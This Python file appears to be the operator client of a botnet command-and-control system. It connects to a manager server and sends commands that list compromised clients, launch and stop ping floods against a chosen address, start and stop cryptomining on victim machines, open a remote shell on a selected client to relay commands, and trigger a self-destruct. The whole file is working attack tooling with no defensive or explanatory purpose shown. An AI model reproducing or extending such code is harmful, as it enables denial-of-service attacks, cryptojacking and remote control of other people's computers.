import time, socket

class Client:

    def __init__(self, addr, client_num):
        self.manager_addr = addr
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_num = client_num
        
        
        self.server.connect(addr)
        print(f'[CONNECTED] Manager at {addr[0]}:{addr[1]}\n')
        self.server.send('manager'.encode('utf-8'))
        print(self.server.recv(1024).decode('utf-8'))
        
            
            
            
    def index_clients(self):
        command = 'cliget'
        self.server.send(command.encode('utf-8'))
        clients = []
        while True:
            msg = self.server.recv(1024).decode('utf-8')
            if msg == 'done':
                break
            else:
                clients.append(msg)
        return clients
        
    def request_info(self):
        command = 'cliget'
        self.server.send(command.encode('utf-8'))
        while True:
            msg = self.server.recv(1024).decode('utf-8')
            if msg == 'done':
                break
            else:
                print(msg)
        

    def start_ping(self, addr, bytecount):
        command = 'ping'
        self.server.send(command.encode('utf-8'))
        time.sleep(1)
        self.server.send(addr.encode('utf-8'))
        time.sleep(1)
        self.server.send(bytecount.encode('utf-8'))
        self.server.recv(1024)

    def stop_ping(self):
        command = 'stop ping'
        self.server.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.server.recv(1024)
        
    def start_mine(self):
        command = 'startmine'
        self.server.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.server.recv(1024)

    def stop_mine(self):
        command = 'stopmine'
        self.server.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.server.recv(1024)


    def start_shell(self, shelladdr):
        #if desired addr = client addr
            command = 'startshell'
            self.server.send(command.encode('utf-8'))
            time.sleep(2)
            command = f'{shelladdr}'
            self.server.send(command.encode('utf-8'))
            print(f'Connecting to client #{shelladdr}')
            response = self.server.recv(1024).decode('utf-8')
            if response == 'connected':
                print(f'Connected to {shelladdr}')
            else:
                print('Could not connect to client')
            

    def send_shell_command(self, command):
        command = command
        self.server.send(command.encode('utf-8'))
        return True
    
    def recieve_shell_response(self):
        recieved = self.server.recv(1024).decode('utf-8')
        return recieved

    def stop_shell(self):
        pass
        
    def destroy(self):
        command = 'selfdestruct'
        self.server.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.server.recv(1024)

    
